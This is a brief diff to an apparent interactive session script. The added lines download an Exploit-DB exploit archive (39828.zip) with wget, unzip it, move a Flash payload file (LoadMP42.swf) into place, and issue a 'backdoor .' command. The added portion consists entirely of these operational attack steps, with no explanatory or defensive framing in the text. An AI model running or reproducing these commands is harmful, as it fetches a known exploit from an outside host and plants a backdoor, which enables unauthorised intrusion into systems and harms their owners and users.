@@ -1,4 +1,8 @@
 refresh
 interact 1
+wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39828.zip
+unzip 39828
+mv 39828/LoadMP42.swf LoadMP42.swf
+backdoor .
 interact quit
 quit
